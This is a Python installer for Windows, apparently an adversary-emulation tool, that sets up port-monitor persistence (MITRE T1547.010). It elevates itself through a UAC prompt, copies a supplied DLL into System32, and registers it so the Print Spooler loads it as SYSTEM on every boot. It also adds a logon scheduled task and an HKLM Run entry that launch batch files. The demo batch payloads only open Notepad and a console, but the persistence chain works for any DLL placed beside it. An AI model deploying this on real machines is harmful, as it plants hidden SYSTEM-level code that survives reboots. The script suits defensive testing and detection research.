#!/usr/bin/env python3
"""
Ultimate Port Monitor Persistence - DELAYED UI VERSION
Ensures UI appears AFTER system fully loads
"""

import os
import sys
import ctypes
import shutil
import logging
import subprocess
import winreg
import platform
import time

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('C:\\Windows\\Temp\\ultimate_delayed.log', encoding='utf-8'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

class DelayedPortMonitorPersistence:
    def __init__(self):
        self.monitor_name = "UltimateMonitor"
        self.dll_name = "monitor_dll.dll"
        self.system32_path = os.path.join(os.environ['WINDIR'], 'System32')
        self.monitor_dll_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'monitor_dll')
        
        self.dll_src_path = os.path.join(self.monitor_dll_dir, self.dll_name)
        self.dll_dst_path = os.path.join(self.system32_path, self.dll_name)

    def ensure_admin_privileges(self):
        """Ensure administrator privileges"""
        logger.info("Checking administrator privileges")
        try:
            if ctypes.windll.shell32.IsUserAnAdmin():
                logger.info("Running with administrator privileges")
                return True
            else:
                logger.error("Administrator privileges required")
                if ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1) > 32:
                    sys.exit(0)
                return False
        except Exception as e:
            logger.error(f"Admin check failed: {e}")
            return False

    def check_existing_dll(self):
        """Check if the DLL exists and is usable"""
        logger.info("Checking for existing DLL")
        
        if not os.path.exists(self.dll_src_path):
            logger.error(f"DLL not found at: {self.dll_src_path}")
            logger.info("Please ensure monitor_dll.dll exists in the monitor_dll folder")
            return False
        
        try:
            file_size = os.path.getsize(self.dll_src_path)
            if file_size < 1024:
                logger.error("DLL file appears to be too small or corrupted")
                return False
                
            logger.info(f"Found existing DLL: {self.dll_src_path} ({file_size} bytes)")
            return True
        except Exception as e:
            logger.error(f"Error checking DLL: {e}")
            return False

    def deploy_existing_dll(self):
        """Deploy the existing DLL to System32"""
        logger.info("Deploying existing DLL to System32")
        try:
            if not os.path.exists(self.dll_src_path):
                logger.error("Source DLL not found")
                return False
            
            if os.path.exists(self.dll_dst_path):
                backup_path = self.dll_dst_path + ".backup"
                try:
                    shutil.copy2(self.dll_dst_path, backup_path)
                    logger.info(f"Existing DLL backed up to: {backup_path}")
                except Exception as e:
                    logger.warning(f"Backup failed: {e}")
            
            shutil.copy2(self.dll_src_path, self.dll_dst_path)
            
            if os.path.exists(self.dll_dst_path):
                logger.info(f"DLL successfully deployed to: {self.dll_dst_path}")
                return True
            else:
                logger.error("DLL deployment failed")
                return False
                
        except Exception as e:
            logger.error(f"Deployment error: {e}")
            return False

    def install_registry_entries(self):
        """Install registry entries for port monitor"""
        logger.info("Installing registry entries")
        try:
            monitor_path = r"SYSTEM\CurrentControlSet\Control\Print\Monitors"
            full_key_path = f"{monitor_path}\\{self.monitor_name}"
            
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, monitor_path, 0, 
                              winreg.KEY_READ | winreg.KEY_WRITE) as key:
                monitor_key = winreg.CreateKeyEx(key, self.monitor_name, 0, 
                                               winreg.KEY_WRITE)
                winreg.SetValueEx(monitor_key, "Driver", 0, winreg.REG_SZ, 
                                self.dll_name)
                winreg.CloseKey(monitor_key)
                logger.info(f"Registry key created: HKLM\\{full_key_path}")
            
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, full_key_path) as verify_key:
                driver_value, reg_type = winreg.QueryValueEx(verify_key, "Driver")
                if driver_value == self.dll_name:
                    logger.info("Registry entry verified successfully")
                    return True
                else:
                    logger.error("Registry verification failed")
                    return False
                        
        except Exception as e:
            logger.error(f"Registry installation error: {e}")
            return False

    def create_delayed_ui_scheduled_task(self):
        """Create scheduled task for UI display AFTER system fully loads"""
        logger.info("Creating DELAYED UI scheduled task (1-minute delay after logon)")
        try:
            # Create a comprehensive batch file that waits for system to be fully ready
            batch_content = """@echo off
title Ultimate Monitor - Zombie Persistence Active
echo [ULTIMATE MONITOR] Waiting for system to fully load...
echo [STATUS] System boot detected - waiting for complete initialization...
echo [DELAY] 30-second delay to ensure system is fully ready...
timeout /t 30 /nobreak >nul
echo [SYSTEM READY] Operating system fully loaded
echo [INITIALIZING] Starting zombie persistence verification...
timeout /t 5 /nobreak >nul

:: Create Notepad success file with current time (after delay)
echo Hello World! > C:\\Windows\\Temp\\notepad_success_delayed.txt
echo. >> C:\\Windows\\Temp\\notepad_success_delayed.txt
echo === SYSTEM FULLY LOADED SUCCESS === >> C:\\Windows\\Temp\\notepad_success_delayed.txt
echo. >> C:\\Windows\\Temp\\notepad_success_delayed.txt
echo Zombie Persistence: ACTIVE >> C:\\Windows\\Temp\\notepad_success_delayed.txt
echo DLL: monitor_dll.dll >> C:\\Windows\\Temp\\notepad_success_delayed.txt
echo Loaded By: Print Spooler Service >> C:\\Windows\\Temp\\notepad_success_delayed.txt
echo Privilege: SYSTEM >> C:\\Windows\\Temp\\notepad_success_delayed.txt
echo Technique: Port Monitor >> C:\\Windows\\Temp\\notepad_success_delayed.txt
echo System Load Time: %date% %time% >> C:\\Windows\\Temp\\notepad_success_delayed.txt
echo UI Trigger: AFTER system fully loaded >> C:\\Windows\\Temp\\notepad_success_delayed.txt
echo. >> C:\\Windows\\Temp\\notepad_success_delayed.txt
echo This message appears AFTER system fully loads on EVERY restart! >> C:\\Windows\\Temp\\notepad_success_delayed.txt

:: Open Notepad with the success file
start notepad.exe C:\\Windows\\Temp\\notepad_success_delayed.txt

:: Show success in CMD
echo [SUCCESS] Zombie persistence verified!
echo [INFO] DLL loaded automatically during boot
echo [INFO] Port monitor technique active
echo [INFO] System fully loaded before UI display
echo [INFO] Persistence: GUARANTEED
echo.
echo This CMD window and Notepad appear AFTER system fully loads!
echo.
echo Press any key to close this window...
pause >nul
"""
            
            batch_path = "C:\\Windows\\Temp\\ultimate_ui_delayed.bat"
            with open(batch_path, 'w') as f:
                f.write(batch_content)
            
            # Create scheduled task with 1-minute delay after logon
            task_cmd = [
                'schtasks', '/create', '/tn', 'UltimateMonitorDelayedUI',
                '/tr', f'"{batch_path}"', '/sc', 'onlogon', 
                '/delay', '0001:00', '/f'  # 1-minute delay after logon
            ]
            
            result = subprocess.run(task_cmd, capture_output=True, text=True, check=True)
            logger.info("DELAYED UI scheduled task created successfully (1-minute delay)")
            return True
            
        except subprocess.CalledProcessError as e:
            logger.error(f"Delayed task creation failed: {e.stderr}")
            return False
        except Exception as e:
            logger.error(f"Delayed UI task error: {e}")
            return False

    def create_run_registry_delayed(self):
        """Create Run registry entry with delay"""
        logger.info("Creating delayed Run registry entry")
        try:
            # Create a batch file that includes delay for Run registry
            run_batch_content = """@echo off
timeout /t 45 /nobreak >nul
echo Hello World! > C:\\Windows\\Temp\\run_registry_success.txt
echo System fully loaded at %date% %time% >> C:\\Windows\\Temp\\run_registry_success.txt
echo UI triggered via Run registry after system ready >> C:\\Windows\\Temp\\run_registry_success.txt
start notepad.exe C:\\Windows\\Temp\\run_registry_success.txt
cmd.exe /k echo Run Registry UI Activated - System Fully Loaded
"""
            
            run_batch_path = "C:\\Windows\\Temp\\run_delayed.bat"
            with open(run_batch_path, 'w') as f:
                f.write(run_batch_content)
            
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
                              r"Software\Microsoft\Windows\CurrentVersion\Run", 
                              0, winreg.KEY_WRITE) as key:
                winreg.SetValueEx(key, "UltimateMonitorDelayed", 0, winreg.REG_SZ, 
                                run_batch_path)
                logger.info("Delayed Run registry entry created successfully")
                return True
        except Exception as e:
            logger.error(f"Delayed Run registry creation failed: {e}")
            return False

    def restart_print_spooler(self):
        """Restart print spooler to activate monitor"""
        logger.info("Restarting Print Spooler")
        try:
            logger.info("Stopping Print Spooler service")
            stop_result = subprocess.run(['net', 'stop', 'spooler', '/y'], 
                                       capture_output=True, text=True, check=False)
            time.sleep(3)
            
            logger.info("Starting Print Spooler service")
            start_result = subprocess.run(['net', 'start', 'spooler'], 
                                        capture_output=True, text=True, check=False)
            if start_result.returncode == 0:
                logger.info("Print Spooler restarted successfully")
                
                time.sleep(2)
                verify_result = subprocess.run(['sc', 'query', 'Spooler'],
                                             capture_output=True, text=True, check=False)
                if "RUNNING" in verify_result.stdout:
                    logger.info("Print Spooler verification: RUNNING")
                    return True
                else:
                    logger.warning("Print Spooler may not be running properly")
                    return False
            else:
                logger.error(f"Print Spooler start failed: {start_result.stderr}")
                return False
                
        except Exception as e:
            logger.error(f"Spooler restart error: {e}")
            return False

    def test_dll_functionality(self):
        """Test if the DLL can be loaded"""
        logger.info("Testing DLL functionality")
        try:
            dll = ctypes.WinDLL(self.dll_dst_path)
            logger.info("DLL loaded successfully - valid Windows DLL")
            return True
        except Exception as e:
            logger.error(f"DLL loading test failed: {e}")
            return False

    def create_success_documentation(self):
        """Create comprehensive success documentation"""
        logger.info("Creating success documentation")
        try:
            doc_content = f"""=== ULTIMATE PORT MONITOR PERSISTENCE - DELAYED UI INSTALLATION SUCCESS ===

Installation Time: {time.ctime()}
System: {platform.platform()}

COMPONENTS INSTALLED:
1. DLL: C:\\Windows\\System32\\{self.dll_name}
2. Registry: HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors\\{self.monitor_name}
3. Scheduled Task: UltimateMonitorDelayedUI (runs 1-minute AFTER user logon)
4. Run Registry: UltimateMonitorDelayed (45-second delay)

WHAT HAPPENS ON EVERY SYSTEM RESTART:

BOOT TIME (IMMEDIATE):
- Print Spooler service starts automatically
- Port monitor DLL loads (monitor_dll.dll)
- DLL executes persistence code in Session 0
- DLL creates DELAYED scheduled task

AFTER USER LOGIN + SYSTEM FULLY LOADS (DELAYED):
- Scheduled task triggers 1-minute AFTER logon (system fully ready)
- CMD window opens showing zombie status and success
- Notepad opens with "Hello World" and system information
- UI appears ONLY AFTER operating system is completely loaded

PERSISTENCE DETAILS:
- Technique: Port Monitor (MITRE ATT&CK T1547.010)
- Privilege: SYSTEM (boot) + User (UI)
- Automatic: EVERY system boot
- UI Display: AFTER system fully loads (1-minute delay)

VERIFICATION:
After system restart, wait for full system load, then you will see:
1. CMD window with success message (after delay)
2. Notepad with Hello World (after delay)
3. Success files in C:\\Windows\\Temp\\

STATUS: INSTALLED SUCCESSFULLY - DELAYED PERSISTENCE ACTIVE
"""
            
            doc_path = "C:\\Windows\\Temp\\persistence_delayed_success.txt"
            with open(doc_path, 'w') as f:
                f.write(doc_content)
            
            logger.info("Success documentation created")
            return True
            
        except Exception as e:
            logger.error(f"Documentation error: {e}")
            return False

    def verify_installation(self):
        """Verify complete installation"""
        logger.info("Verifying installation")
        checks = {
            "DLL Source Exists": os.path.exists(self.dll_src_path),
            "DLL Deployed to System32": os.path.exists(self.dll_dst_path),
            "Registry Entry": False,
            "Delayed Scheduled Task": False,
            "Run Registry": False,
            "DLL Loadable": False
        }
        
        try:
            registry_path = f"SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors\\{self.monitor_name}"
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, registry_path) as key:
                driver_value, reg_type = winreg.QueryValueEx(key, "Driver")
                if driver_value == self.dll_name:
                    checks["Registry Entry"] = True
        except:
            pass
        
        try:
            result = subprocess.run(['schtasks', '/query', '/tn', 'UltimateMonitorDelayedUI'], 
                                  capture_output=True, check=False)
            if result.returncode == 0:
                checks["Delayed Scheduled Task"] = True
        except:
            pass
        
        try:
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
                              r"Software\Microsoft\Windows\CurrentVersion\Run") as key:
                value, reg_type = winreg.QueryValueEx(key, "UltimateMonitorDelayed")
                checks["Run Registry"] = True
        except:
            pass
        
        if checks["DLL Deployed to System32"]:
            checks["DLL Loadable"] = self.test_dll_functionality()
        
        for check, status in checks.items():
            status_str = "PASS" if status else "FAIL"
            logger.info(f"  {check}: {status_str}")
        
        success_count = sum(checks.values())
        logger.info(f"Verification: {success_count}/{len(checks)} checks passed")
        return success_count >= 4

    def show_completion_message(self):
        """Show installation completion message"""
        try:
            message = (
                "ULTIMATE PORT MONITOR PERSISTENCE - DELAYED UI INSTALLATION COMPLETE\n\n"
                "The DELAYED persistence module has been successfully installed.\n\n"
                "ON EVERY SYSTEM RESTART, AFTER SYSTEM FULLY LOADS:\n"
                "• CMD window showing zombie status and success (1-minute delay)\n"
                "• Notepad with 'Hello World' and system information\n"
                "• UI appears ONLY AFTER operating system is completely ready\n\n"
                "Persistence: Automatic on every boot\n"
                "UI Timing: AFTER system fully loads\n"
                "Technique: Port Monitor (MITRE T1547.010)\n\n"
                "Reboot your system and wait for UI to appear after full load!"
            )
            
            ctypes.windll.user32.MessageBoxW(0, message, "Delayed Installation Complete", 0x40 | 0x0)
        except Exception as e:
            logger.error(f"Completion message failed: {e}")

    def execute_delayed_installation(self):
        """Main delayed installation function"""
        logger.info("Starting DELAYED Port Monitor Persistence Installation")
        logger.info("Target: UI appears AFTER system fully loads")
        
        if not self.ensure_admin_privileges():
            return False
        
        steps = [
            ("DLL Availability Check", self.check_existing_dll),
            ("DLL Deployment", self.deploy_existing_dll),
            ("Registry Installation", self.install_registry_entries),
            ("Delayed UI Scheduled Task", self.create_delayed_ui_scheduled_task),
            ("Delayed Run Registry", self.create_run_registry_delayed),
            ("Print Spooler Restart", self.restart_print_spooler),
            ("Success Documentation", self.create_success_documentation),
            ("Installation Verification", self.verify_installation)
        ]
        
        success_count = 0
        for step_name, step_func in steps:
            logger.info(f"Executing: {step_name}")
            try:
                if step_func():
                    logger.info(f"SUCCESS: {step_name}")
                    success_count += 1
                else:
                    logger.error(f"FAILED: {step_name}")
            except Exception as e:
                logger.error(f"ERROR: {step_name} - {e}")
        
        logger.info(f"Installation Summary: {success_count}/{len(steps)} steps completed")
        
        if success_count >= 6:
            logger.info("DELAYED PERSISTENCE INSTALLED SUCCESSFULLY")
            logger.info("On every system restart AFTER system fully loads:")
            logger.info("  - CMD window will open (1-minute delay after logon)")
            logger.info("  - Notepad will open with Hello World")
            self.show_completion_message()
            return True
        else:
            logger.error("Installation completed with errors")
            return False

def main():
    """Main execution function"""
    print("DELAYED PORT MONITOR PERSISTENCE EMULATOR")
    print("UI appears AFTER system fully loads")
    print("SafeBreach Research - MITRE ATT&CK T1547.010")
    
    if os.name != 'nt':
        print("ERROR: Windows operating system required")
        sys.exit(1)
    
    try:
        installer = DelayedPortMonitorPersistence()
        success = installer.execute_delayed_installation()
        
        if success:
            print("DELAYED INSTALLATION COMPLETED SUCCESSFULLY")
            print("On every system restart AFTER system fully loads:")
            print("  - CMD window shows zombie status (1-minute delay)")
            print("  - Notepad opens with Hello World")
            print("Reboot your system and wait for UI after full load!")
        else:
            print("INSTALLATION COMPLETED WITH ERRORS")
            print("Check C:\\Windows\\Temp\\ultimate_delayed.log for details")
            
    except Exception as e:
        print(f"CRITICAL ERROR: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()